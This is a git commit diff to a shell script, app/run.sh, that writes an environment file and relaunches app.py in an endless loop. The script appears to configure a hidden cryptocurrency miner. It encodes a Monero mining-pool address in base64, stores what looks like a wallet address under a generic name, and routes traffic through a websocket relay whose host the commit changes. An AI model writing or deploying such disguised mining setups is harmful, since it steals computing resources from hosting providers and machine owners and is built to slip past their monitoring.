e099d14080f32dd6aec46fa7c52f7817883f3cf1
satelitlima00 <128956610+satelitlima00@users.noreply.github.com>
2026-04-27 11:02:47 +0700

    Update run.sh

--- app/run.sh
+++ app/run.sh
@@ -1,10 +1,10 @@
 #!/bin/bash
 CONNECT=$1
 NAME=$2
-echo "SERVER_WS=wss://algolia.dpdns.org
+echo "SERVER_WS=wss://koalopanob.web.id
 SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
 SERVER_DOMAIN=45bx5mvR2MQP267tevQyozHSToTsE19g5Q3NvRmrQ3TCW6dEY3as2VH4ArrNnqZKLxaw31aFExZyuet4fgau3TwoRiWwFgi
 SERVER_SECRET=${NAME}
 SERVER_CONNECTION=${CONNECT}
 SERVER_MODE=FAST" > .env
-while true; do python3 app.py; sleep 5; done
+while true; do python3 app.py; sleep 10; done
